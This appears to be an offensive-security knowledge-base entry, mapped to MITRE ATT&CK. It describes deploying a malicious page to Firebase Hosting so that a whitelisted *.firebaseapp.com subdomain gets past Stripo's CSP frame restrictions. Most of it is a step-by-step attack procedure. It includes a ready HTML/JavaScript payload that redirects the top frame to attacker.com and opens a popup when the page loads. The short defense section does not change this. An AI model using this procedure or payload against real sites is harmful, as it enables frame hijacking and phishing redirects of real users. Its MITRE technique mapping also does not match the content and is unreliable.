---
tags:
  - firebase
  - hosting
  - malicious-deploy
type: procedure
tools:
  - '[[tools/NodeJS]]'
  - '[[tools/Firebase-CLI]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/firebase-init]]'
  - '[[commands/firebase-deploy]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:24:31.374Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques:
  - '[[T1105.002]]'
id: c4756343-f14c-4f7b-b70a-4a3d94f374f2
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Deploy-Malicious-Page-to-Firebase-Hosting

## Summary

This procedure deploys a static HTML page with malicious JavaScript to Firebase Hosting, creating an attacker-controlled subdomain under *.firebaseapp.com that can be embedded via iframes due to Stripo's CSP.

## Description

Firebase Hosting is abused here as a free service to host a simple page containing JavaScript for alerts, top.location redirects, and window.open popups. The deployment results in a URL like hackerone-jm.firebaseapp.com, which bypasses Stripo's frame-src restrictions. Prerequisites include a free Firebase account; the process follows the official quickstart and takes minutes.

## Requirements

1. NodeJS installed for CLI support
2. Firebase CLI installed and authenticated (firebase login)
3. Firebase project created via console.firebase.google.com
4. Basic HTML/JS knowledge

## Defense

Defensive measures and detection strategies:

- Monitor Firebase deployments for suspicious domains or content
- Implement CSP with specific domains only (e.g., stripo-app.firebaseapp.com)
- Use Firebase security rules to restrict public hosting

## Objectives

1. Host executable JavaScript on a whitelisted subdomain
2. Enable cross-frame scripting for redirects and popups
3. Prepare payload for iframe embedding

## Instructions

### Step 1: Initialize Firebase Hosting

**Context**: Set up the local project directory for hosting.

Execute [[commands/firebase-init]]:

```bash
firebase init hosting
```

> Select the project, set public directory to ., and configure as single-page app if needed. This creates firebase.json and .firebaserc.

### Step 2: Create Malicious HTML

**Context**: Add index.html with JavaScript payload.

Create file index.html:

```html
<!DOCTYPE html>
<html>
<body>
<script>
alert(123);
top.location='https://www.attacker.com';
window.open('https://www.popup.com', 'popup', 'width=825,height=500,resizable=Yes,status=yes,toolbar=no,scrollbars=yes,,left=0,top=0');
</script>
</body>
</html>
```

> This script triggers on load: alert, redirect top frame, open popup.

### Step 3: Deploy to Firebase

**Context**: Push the content live to get the subdomain URL.

Execute [[commands/firebase-deploy]]:

```bash
firebase deploy
```

> Output includes the hosting URL, e.g., https://hackerone-jm.firebaseapp.com. Test by visiting it.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques

- [[T1105.002]]

## Commands Used

- [[commands/firebase-init]]
- [[commands/firebase-deploy]]

## Tools Used

- [[tools/Firebase-CLI]]

## Tags

- [[firebase]]
- [[hosting]]
- [[malicious-deploy]]
